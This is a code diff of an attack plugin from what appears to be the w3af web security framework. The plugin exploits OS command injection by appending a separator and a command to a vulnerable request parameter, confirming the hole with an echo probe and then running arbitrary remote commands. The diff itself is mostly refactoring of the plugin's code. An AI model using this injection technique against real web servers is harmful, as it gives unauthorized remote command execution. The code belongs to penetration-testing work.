@@ -20,17 +20,21 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
 
-from core.data.fuzzer.fuzzer import createRandAlpha
-import core.controllers.outputManager as om
+
+
 
 # options
 from core.data.options.option import option
 from core.data.options.optionList import optionList
 
-from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
+from core.data.kb.exec_shell import exec_shell as exec_shell
+from core.data.fuzzer.fuzzer import createRandAlpha
 
-from core.data.kb.shell import shell as shell
+from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
 from core.controllers.w3afException import w3afException
+import core.controllers.outputManager as om
+
+from plugins.attack.payloads.decorators.exec_decorator import exec_debug
 
 
 class osCommandingShell(baseAttackPlugin):
@@ -97,7 +101,7 @@ class osCommandingShell(baseAttackPlugin):
             # Create the shell object
             shell_obj = osShell( vuln )
             shell_obj.setUrlOpener( self._urlOpener )
-            shell_obj.setCut( self._header, self._footer )
+            shell_obj.set_cut( self._header_length, self._footer_length )
             return shell_obj
             
         else:
@@ -113,7 +117,7 @@ class osCommandingShell(baseAttackPlugin):
         # kb.kb.append( self, 'osCommanding', v )
         exploitDc = vuln.getDc()
         
-        if exploitDc == None:
+        if exploitDc is None:
             om.out.error('You hitted bug #1948260. Please report how to reproduce it here:')
             bug_URL = 'https://sourceforge.net/tracker/index.php?func=detail&aid=1948260'
             bug_URL += '&group_id=170274&atid=853652'
@@ -123,8 +127,11 @@ class osCommandingShell(baseAttackPlugin):
         rand = createRandAlpha( 8 )
         if vuln['os'] == 'windows':
             command = vuln['separator'] + 'echo ' + rand
+            # TODO: Confirm that this works in windows
+            rand = rand + '\n\n'
         else:
             command = vuln['separator'] + '/bin/echo ' + rand
+            rand = rand + '\n'
             
         # Lets define the result header and footer.
         functionReference = getattr( self._urlOpener , vuln.getMethod() )
@@ -135,7 +142,7 @@ class osCommandingShell(baseAttackPlugin):
             om.out.error( str(e) )
             return False
         else:
-            return self._defineCut( response.getBody(), rand , exact=True )
+            return self._define_exact_cut( response.getBody(), rand )
     
     def getOptions(self):
         '''
@@ -227,9 +234,17 @@ class osCommandingShell(baseAttackPlugin):
             - generateOnlyOne
         '''
 
-class osShell(shell):
-    def _rexec( self, command ):
-        # Lets send the command.
+class osShell(exec_shell):
+ 
+    @exec_debug
+    def execute(self, command):
+        '''
+        This method executes a command in the remote operating system by
+        exploiting the vulnerability.
+
+        @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
+        @return: The result of the command.
+        '''
         functionReference = getattr( self._urlOpener , self.getMethod() )
         exploitDc = self.getDc()
         exploitDc[ self.getVar() ] = self['separator'] + command
@@ -239,7 +254,7 @@ class osShell(shell):
             return 'Error "' + str(e) + '" while sending command to remote host. Please try again.'
         else:
             return self._cut( response.getBody() )
-    
+            
     def end( self ):
         om.out.debug('osShell cleanup complete.')
         
